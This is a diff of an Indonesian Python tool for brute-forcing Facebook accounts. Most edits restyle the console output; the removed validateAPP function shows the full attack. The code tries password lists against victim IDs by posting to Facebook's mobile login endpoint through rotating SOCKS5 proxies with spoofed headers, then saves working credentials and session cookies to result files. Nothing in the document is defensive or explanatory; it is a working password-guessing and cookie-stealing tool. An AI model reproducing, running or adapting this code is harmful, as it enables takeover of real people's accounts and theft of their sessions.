@@ -212,7 +212,7 @@ class REQ:
        except requests.exceptions.ConnectionError as e:
            Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
        self.clearTerminal(platform) ; self.Logooo()
-       Console().print(f"✶ ━━⫸[•]{U2}Nama Tumbal {M2}{nama}{x}\n✶ ━━⫸[•]{U2}Id Tumbal {B2}{id}")
+       Console().print(f"{M2}✶ {H2}━━⫸[•]{U2}Nama Tumbal {M2}{nama}\n{M2}✶ {H2}━━⫸[•]{U2}Id Tumbal {B2}{id}")
        Console().print(f'\n{H2}╰─▶ {H2}01{P2}. {U2}Crack publik\n{H2}╰─▶ {H2}02{P2}. {U2}Crack massal\n{H2}╰─▶ {H2}03{P2}. {U2}Crack email\n{H2}╰─▶ {H2}04{P2}. {U2}Crack file\n{H2}╰─▶ {H2}05{P2}. {U2}Result OK/CP\n{H2}╰─▶ {M2}00{P2}. {U2}Log-out ( Cookie )')
        ykhh = Console().input(f'\n{M2}Input : ')
        
@@ -508,7 +508,7 @@ class Furthermore:
             Console().print(f'\n[•]{U2} Selamat, Anda Mendapatkan {U2}Hasil OK {H2} {len(self.live)} {U2}Dan Hasil CP {K2}: {len(self.check)}') ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
    
    def asyncAPI(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
        prog.advance(des) 
        ses = requests.Session()
        proxx = REQ().get_Proxy()
@@ -567,7 +567,7 @@ class Furthermore:
                if "c_user" in ses.cookies.get_dict():
                   kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                   tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
+                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                   prints(tree)
                   kntl = (f"{user}|{pw}|{kuki}")
                   self.live.append(kntl)
@@ -575,7 +575,7 @@ class Furthermore:
                         r.write(kntl+"\n")
                   break
                elif "checkpoint" in ses.cookies.get_dict():
-                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
+                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                     kntl = (f"{user}|{pw}")
                     self.check.append(kntl)
                     with open("Results/cp.txt", "a", encoding="utf-8") as r:
@@ -584,14 +584,14 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des) 
+               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
+               prog.advance(des)
                sleep(15)
        self.loop+=1
    
    def validateAPI(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-       prog.advance(des)  
+       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
+       prog.advance(des) 
        ses = requests.Session()
        proxx = REQ().get_Proxy()
        ua = REQ().UserAgent_API()
@@ -638,7 +638,7 @@ class Furthermore:
                if "c_user" in ses.cookies.get_dict():
                   kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                   tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
+                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                   prints(tree)
                   kntl = (f"{user}|{pw}|{kuki}")
                   self.live.append(kntl)
@@ -646,7 +646,7 @@ class Furthermore:
                         r.write(kntl+"\n")
                   break
                elif "checkpoint" in ses.cookies.get_dict():
-                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
+                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                     kntl = (f"{user}|{pw}")
                     self.check.append(kntl)
                     with open("Results/cp.txt", "a", encoding="utf-8") as r:
@@ -655,14 +655,14 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des) 
+               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
+               prog.advance(des)
                sleep(15)
        self.loop+=1
    
    def regularAPI(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-       prog.advance(des)  
+       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
+       prog.advance(des) 
        ses = requests.Session()
        proxx = REQ().get_Proxy()
        ua = REQ().UserAgent()
@@ -705,7 +705,7 @@ class Furthermore:
                if "c_user" in ses.cookies.get_dict():
                   kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                   tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
+                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                   prints(tree)
                   kntl = (f"{user}|{pw}|{kuki}")
                   self.live.append(kntl)
@@ -713,7 +713,7 @@ class Furthermore:
                         r.write(kntl+"\n")
                   break
                elif "checkpoint" in ses.cookies.get_dict():
-                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
+                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                     kntl = (f"{user}|{pw}")
                     self.check.append(kntl)
                     with open("Results/cp.txt", "a", encoding="utf-8") as r:
@@ -722,13 +722,13 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des) 
+               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
+               prog.advance(des)
                sleep(15)
        self.loop+=1
    
    def asyncAPP(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
        prog.advance(des) 
        ses = requests.Session()
        proxx = REQ().get_Proxy()
@@ -787,7 +787,7 @@ class Furthermore:
                if "c_user" in ses.cookies.get_dict():
                   kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                   tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
+                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                   prints(tree)
                   kntl = (f"{user}|{pw}|{kuki}")
                   self.live.append(kntl)
@@ -795,7 +795,7 @@ class Furthermore:
                         r.write(kntl+"\n")
                   break
                elif "checkpoint" in ses.cookies.get_dict():
-                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
+                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                     kntl = (f"{user}|{pw}")
                     self.check.append(kntl)
                     with open("Results/cp.txt", "a", encoding="utf-8") as r:
@@ -804,79 +804,8 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des) 
-               sleep(15)
-       self.loop+=1
-   
-   def validateAPP(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-       prog.advance(des) 
-       ses = requests.Session()
-       proxx = REQ().UserAgent_APP()
-       ua = REQ().UserAgent()
-       for pw in password:
-           try:
-               proxis = {'http': 'socks5://' + random.choice(proxx)}
-               link = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers = {'User-Agent':ua})
-               data = {
-                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
-                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
-                 "uid":user,
-                 "next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
-                 "flow":"login_no_pin",
-                 "pass":pw
-               }
-               headers = {
-                  "Host": "mbasic.facebook.com",
-                  "content-length": "746",
-                  "cache-control": "max-age=0",
-                  "dpr": "1.4375",
-                  "viewport-width": "980",
-                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
-                  "sec-ch-ua-mobile": "?1",
-                  "sec-ch-ua-platform": '"Android"',
-                  "sec-ch-ua-platform-version": '"12.0.0"',
-                  "sec-ch-ua-model": '"CPH2127"',
-                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
-                  "sec-ch-prefers-color-scheme": "light",
-                  "upgrade-insecure-requests": "1",
-                  "origin": "https://mbasic.facebook.com",
-                  "content-type": "application/x-www-form-urlencoded",
-                  "user-agent": ua,
-                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                  "sec-fetch-site": "same-origin",
-                  "sec-fetch-mode": "navigate",
-                  "sec-fetch-user": "?1",
-                  "sec-fetch-dest": "document",
-                  "referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
-                  "accept-encoding": "gzip, deflate, br",
-                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
-               }
-               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-               response = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=True)
-               if "c_user" in ses.cookies.get_dict():
-                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                  tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
-                  prints(tree)
-                  kntl = (f"{user}|{pw}|{kuki}")
-                  self.live.append(kntl)
-                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
-                        r.write(kntl+"\n")
-                  break
-               elif "checkpoint" in ses.cookies.get_dict():
-                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
-                    kntl = (f"{user}|{pw}")
-                    self.check.append(kntl)
-                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
-                        r.write(kntl+"\n")
-                    break
-               else:
-                    continue
-           except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des) 
+               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
+               prog.advance(des)
                sleep(15)
        self.loop+=1
 #----------------------[ LICENSE ]---------------------#
